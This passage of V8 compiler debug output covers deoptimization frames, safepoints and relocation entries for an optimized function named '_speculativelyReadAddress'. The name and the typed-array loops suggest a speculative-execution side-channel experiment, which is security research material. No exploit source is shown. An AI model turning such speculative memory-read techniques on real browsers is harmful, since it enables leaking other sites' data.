                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
    17               85   30f  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=85, function=0x2c2783f95d59 <String[25]: _speculativelyReadAddress>, height=12}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=4}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=10 (6)}
                               STACK_SLOT {input=9}
                               INT32_STACK_SLOT {input=10}
                               STACK_SLOT {input=11}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
    18               85   32e  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=85, function=0x2c2783f95d59 <String[25]: _speculativelyReadAddress>, height=12}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=4}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               INT32_STACK_SLOT {input=5}
                               STACK_SLOT {input=9}
                               INT32_STACK_SLOT {input=10}
                               STACK_SLOT {input=11}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
    19              172   3d3  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=172, function=0x2c2783f95d59 <String[25]: _speculativelyReadAddress>, height=12}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=4}
                               INT32_STACK_SLOT {input=5}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               INT32_STACK_SLOT {input=6}
                               INT32_STACK_SLOT {input=7}
                               STACK_SLOT {input=9}
                               INT32_STACK_SLOT {input=10}
                               STACK_SLOT {input=11}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               INT32_STACK_SLOT {input=8}
    20              124   418  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=124, function=0x2c2783f95d59 <String[25]: _speculativelyReadAddress>, height=12}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=4}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               INT32_STACK_SLOT {input=5}
                               INT32_STACK_SLOT {input=6}
                               INT32_STACK_SLOT {input=7}
                               INT32_STACK_SLOT {input=8}
                               STACK_SLOT {input=9}
                               INT32_STACK_SLOT {input=10}
                               STACK_SLOT {input=11}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               STACK_SLOT {input=12}

Safepoints (size = 136)
0x622d186d816      56   419  0000000010000 (sp -> fp)       0
0x622d186d869      a9   41e  0100000010000 (sp -> fp)       1
0x622d186da9b     2db   464  0000000010000 (sp -> fp)      15
0x622d186dab2     2f2   469  0100000010000 (sp -> fp)      16
0x622d186dacf     30f   46e  0101000010000 (sp -> fp)      17
0x622d186daee     32e   473  0101100010000 (sp -> fp)      18
0x622d186db93     3d3   478  0101000010000 (sp -> fp)      19
0x622d186dbd8     418   47d  1101000010000 (sp -> fp)      20

RelocInfo (size = 1322)
0x622d186d7c0  comment  (-- <not inlined:330> --)
0x622d186d7c0  comment  (-- Prologue: check for deoptimization --)
0x622d186d7ca  code target (BUILTIN CompileLazyDeoptimizedCode)  (0x622d178ef20)
0x622d186d7ce  comment  (-- B0 start (construct frame) --)
0x622d186d7e9  comment  (-- B2 start --)
0x622d186d7e9  comment  (-- B3 start --)
0x622d186d7e9  comment  (-- <not inlined:359> --)
0x622d186d7fd  embedded object  (0x3b2a3bd127e9 <JSFunction Uint8Array (sfi = 0x18d859c94b01)>)
0x622d186d812  code target (BUILTIN CreateTypedArray)  (0x622d17cb960)
0x622d186d820  comment  (-- B4 start (loop up to 28) --)
0x622d186d820  comment  (-- <not inlined:817> --)
0x622d186d82f  comment  (-- B5 start (in loop 4) --)
0x622d186d82f  comment  (-- <not inlined:799> --)
0x622d186d83c  comment  (-- B7 start (in loop 4) --)
0x622d186d83c  comment  (-- B8 start (in loop 4) --)
0x622d186d83c  comment  (-- <not inlined:879> --)
0x622d186d84b  embedded object  (0x3b2a3bd127e9 <JSFunction Uint8Array (sfi = 0x18d859c94b01)>)
0x622d186d865  code target (BUILTIN CreateTypedArray)  (0x622d17cb960)
0x622d186d869  comment  (-- <not inlined:918> --)
0x622d186d87a  comment  (-- B10 start (in loop 4) --)
0x622d186d87a  comment  (-- B11 start (in loop 4) --)
0x622d186d87a  comment  (-- <not inlined:1314> --)
0x622d186d87c  embedded object  (0x36973b29d869 <FunctionContext[12]>)
0x622d186d892  comment  (-- B12 start (in loop 4) --)
0x622d186d892  comment  (-- <not inlined:1336> --)
0x622d186d8a2  comment  (-- <not inlined:1319> --)
0x622d186d8ad  comment  (-- <not inlined:1461> --)
0x622d186d8af  embedded object  (0x08c012604781 <Map(UINT8_ELEMENTS)>)
0x622d186d8d9  comment  (-- <not inlined:1550> --)
0x622d186d8db  embedded object  (0x36973b29d959 <Uint8Array map = 0x8c012604781>)
0x622d186d90b  comment  (-- <not inlined:1723> --)
0x622d186d91d  comment  (-- B13 start (in loop 4) --)
0x622d186d91d  comment  (-- <not inlined:1742> --)
0x622d186d94c  comment  (-- <not inlined:1728> --)
0x622d186d960  comment  (-- B14 start (loop up to 27) (in loop 4) --)
0x622d186d960  comment  (-- <not inlined:950> --)
0x622d186d96d  comment  (-- B15 start (in loop 14) --)
0x622d186d96d  comment  (-- <not inlined:918> --)
0x622d186d97a  comment  (-- B17 start (in loop 14) --)
0x622d186d97a  comment  (-- B18 start (in loop 14) --)
0x622d186d97a  comment  (-- <not inlined:1058> --)
0x622d186d985  comment  (-- <not inlined:1314> --)
0x622d186d989  comment  (-- <not inlined:1175> --)
0x622d186d990  comment  (-- <not inlined:1111> --)
0x622d186d997  comment  (-- <not inlined:1314> --)
0x622d186d9a5  comment  (-- B19 start (in loop 14) --)
0x622d186d9a5  comment  (-- <not inlined:1336> --)
0x622d186d9bf  comment  (-- <not inlined:1723> --)
0x622d186d9c6  comment  (-- <not inlined:1319> --)
0x622d186d9ca  comment  (-- <not inlined:1461> --)
0x622d186d9e2  comment  (-- B20 start (in loop 14) --)
0x622d186d9e2  comment  (-- B21 start (in loop 14) --)
0x622d186d9e2  comment  (-- <not inlined:1483> --)
0x622d186d9ec  comment  (-- B22 start (in loop 14) --)
0x622d186d9ec  comment  (-- B23 start (in loop 14) --)
0x622d186d9ec  comment  (-- B24 start (in loop 14) --)
0x622d186d9ec  comment  (-- <not inlined:1550> --)
0x622d186da14  comment  (-- <not inlined:1723> --)
0x622d186da1e  comment  (-- B25 start (in loop 14) --)
0x622d186da1e  comment  (-- <not inlined:1742> --)
0x622d186da28  comment  (-- <not inlined:1746> --)
0x622d186da2b  comment  (-- <not inlined:1742> --)
0x622d186da2f  comment  (-- <not inlined:1762> --)
0x622d186da33  comment  (-- <not inlined:1742> --)
0x622d186da3b  comment  (-- <not inlined:1780> --)
0x622d186da41  comment  (-- <not inlined:1742> --)
0x622d186da57  comment  (-- <not inlined:1728> --)
0x622d186da5f  comment  (-- B26 start (in loop 14) --)
0x622d186da5f  comment  (-- <not inlined:957> --)
0x622d186da6f  comment  (-- B27 start (in loop 4) --)
0x622d186da6f  comment  (-- <not inlined:846> --)
0x622d186da7b  comment  (-- B28 start (deconstruct frame) --)
0x622d186da7b  comment  (-- <not inlined:1871> --)
0x622d186da86  comment  (-- B35 start (no frame) --)
0x622d186da86  comment  (-- B1 start (deferred) --)
0x622d186da86  comment  (-- <not inlined:330> --)
0x622d186da97  code target (BUILTIN CEntry_Return1_DontSaveFPRegs_ArgvOnStack_NoBuiltinExit)  (0x622d17cfb00)
0x622d186daa0  comment  (-- B6 start (deferred) (in loop 4) --)
0x622d186daa0  comment  (-- <not inlined:799> --)
0x622d186daae  code target (BUILTIN CEntry_Return1_DontSaveFPRegs_ArgvOnStack_NoBuiltinExit)  (0x622d17cfb00)
0x622d186dabd  comment  (-- B9 start (deferred) (in loop 4) --)
0x622d186dabd  comment  (-- <not inlined:918> --)
0x622d186dacb  code target (BUILTIN CEntry_Return1_DontSaveFPRegs_ArgvOnStack_NoBuiltinExit)  (0x622d17cfb00)
0x622d186dad8  comment  (-- B16 start (deferred) (in loop 14) --)
0x622d186daea  code target (BUILTIN CEntry_Return1_DontSaveFPRegs_ArgvOnStack_NoBuiltinExit)  (0x622d17cfb00)
0x622d186dafc  embedded object  (0x36973b29d869 <FunctionContext[12]>)
0x622d186db06  embedded object  (0x08c012604781 <Map(UINT8_ELEMENTS)>)
0x622d186db10  embedded object  (0x36973b29d959 <Uint8Array map = 0x8c012604781>)
0x622d186db21  comment  (-- B29 start (deferred) --)
0x622d186db3a  comment  (-- B30 start (deferred) --)
0x622d186db57  comment  (-- B31 start (deferred) --)
0x622d186db70  comment  (-- B32 start (deferred) --)
0x622d186db72  embedded object  (0x2c2783f95c31 <String[4]: junk>)
0x622d186db7b  comment  (-- <not inlined:1723> --)
0x622d186db8f  code target (BUILTIN CEntry_Return1_DontSaveFPRegs_ArgvOnStack_NoBuiltinExit)  (0x622d17cfb00)
0x622d186db93  comment  (-- B33 start (deferred) --)
0x622d186dbb8  comment  (-- B34 start (deferred) --)
0x622d186dbba  embedded object  (0x2c2783f95c31 <String[4]: junk>)
0x622d186dbc3  comment  (-- <not inlined:1314> --)
0x622d186dbd4  code target (BUILTIN CEntry_Return1_DontSaveFPRegs_ArgvOnStack_NoBuiltinExit)  (0x622d17cfb00)
0x622d186dbd9  deopt script offset  (359)
0x622d186dbd9  deopt inlining id  (-1)
0x622d186dbd9  deopt reason  ((unknown))
0x622d186dbd9  deopt index
0x622d186dbda  runtime entry  (lazy deoptimization bailout 0)
0x622d186dbde  deopt script offset  (879)
0x622d186dbde  deopt inlining id  (-1)
0x622d186dbde  deopt reason  ((unknown))
0x622d186dbde  deopt index
0x622d186dbdf  runtime entry  (lazy deoptimization bailout 1)
0x622d186dbe3  deopt script offset  (1336)
0x622d186dbe3  deopt inlining id  (-1)
0x622d186dbe3  deopt reason  (not a Smi)
0x622d186dbe3  deopt index
0x622d186dbe4  runtime entry  (eager deoptimization bailout 2)
0x622d186dbe8  deopt script offset  (1461)
0x622d186dbe8  deopt inlining id  (-1)
0x622d186dbe8  deopt reason  (wrong map)
0x622d186dbe8  deopt index
0x622d186dbe9  runtime entry  (eager deoptimization bailout 3)
0x622d186dbed  deopt script offset  (1461)
0x622d186dbed  deopt inlining id  (-1)
0x622d186dbed  deopt reason  (out of bounds)
0x622d186dbed  deopt index
0x622d186dbee  runtime entry  (eager deoptimization bailout 4)
0x622d186dbf2  deopt script offset  (1550)
0x622d186dbf2  deopt inlining id  (-1)
0x622d186dbf2  deopt reason  (wrong map)
0x622d186dbf2  deopt index
0x622d186dbf3  runtime entry  (eager deoptimization bailout 5)
0x622d186dbf7  deopt script offset  (1550)
0x622d186dbf7  deopt inlining id  (-1)
0x622d186dbf7  deopt reason  (out of bounds)
0x622d186dbf7  deopt index
0x622d186dbf8  runtime entry  (eager deoptimization bailout 6)
0x622d186dbfc  deopt script offset  (1742)
0x622d186dbfc  deopt inlining id  (-1)
0x622d186dbfc  deopt reason  (wrong map)
0x622d186dbfc  deopt index
0x622d186dbfd  runtime entry  (eager deoptimization bailout 7)
0x622d186dc01  deopt script offset  (1742)
0x622d186dc01  deopt inlining id  (-1)
0x622d186dc01  deopt reason  (out of bounds)
0x622d186dc01  deopt index
0x622d186dc02  runtime entry  (eager deoptimization bailout 8)
0x622d186dc06  deopt script offset  (1336)
0x622d186dc06  deopt inlining id  (-1)
0x622d186dc06  deopt reason  (not a Smi)
0x622d186dc06  deopt index
0x622d186dc07  runtime entry  (eager deoptimization bailout 9)
0x622d186dc0b  deopt script offset  (1461)
0x622d186dc0b  deopt inlining id  (-1)
0x622d186dc0b  deopt reason  (out of bounds)
0x622d186dc0b  deopt index
0x622d186dc0c  runtime entry  (eager deoptimization bailout 10)
0x622d186dc10  deopt script offset  (1550)
0x622d186dc10  deopt inlining id  (-1)
0x622d186dc10  deopt reason  (wrong map)
0x622d186dc10  deopt index
0x622d186dc11  runtime entry  (eager deoptimization bailout 11)
0x622d186dc15  deopt script offset  (1550)
0x622d186dc15  deopt inlining id  (-1)
0x622d186dc15  deopt reason  (out of bounds)
0x622d186dc15  deopt index
0x622d186dc16  runtime entry  (eager deoptimization bailout 12)
0x622d186dc1a  deopt script offset  (1742)
0x622d186dc1a  deopt inlining id  (-1)
0x622d186dc1a  deopt reason  (wrong map)
0x622d186dc1a  deopt index
0x622d186dc1b  runtime entry  (eager deoptimization bailout 13)
0x622d186dc1f  deopt script offset  (1742)
0x622d186dc1f  deopt inlining id  (-1)
0x622d186dc1f  deopt reason  (out of bounds)
0x622d186dc1f  deopt index
0x622d186dc20  runtime entry  (eager deoptimization bailout 14)
0x622d186dc24  deopt script offset  (330)
0x622d186dc24  deopt inlining id  (-1)
0x622d186dc24  deopt reason  ((unknown))
0x622d186dc24  deopt index
0x622d186dc25  runtime entry  (lazy deoptimization bailout 15)
0x622d186dc29  deopt script offset  (799)
0x622d186dc29  deopt inlining id  (-1)
0x622d186dc29  deopt reason  ((unknown))
0x622d186dc29  deopt index
0x622d186dc2a  runtime entry  (lazy deoptimization bailout 16)
0x622d186dc2e  deopt script offset  (918)
0x622d186dc2e  deopt inlining id  (-1)
0x622d186dc2e  deopt reason  ((unknown))
0x622d186dc2e  deopt index
0x622d186dc2f  runtime entry  (lazy deoptimization bailout 17)
0x622d186dc33  deopt script offset  (918)
0x622d186dc33  deopt inlining id  (-1)
0x622d186dc33  deopt reason  ((unknown))
0x622d186dc33  deopt index
0x622d186dc34  runtime entry  (lazy deoptimization bailout 18)
0x622d186dc38  deopt script offset  (1723)
0x622d186dc38  deopt inlining id  (-1)
0x622d186dc38  deopt reason  ((unknown))
0x622d186dc38  deopt index
0x622d186dc39  runtime entry  (lazy deoptimization bailout 19)
0x622d186dc3d  deopt script offset  (1314)
0x622d186dc3d  deopt inlining id  (-1)
0x622d186dc3d  deopt reason  ((unknown))
0x622d186dc3d  deopt index
0x622d186dc3e  runtime entry  (lazy deoptimization bailout 20)
0x622d186dc44  comment  (;;; Safepoint table.)

--- End code ---
42
43
44
45
46
47
48
49
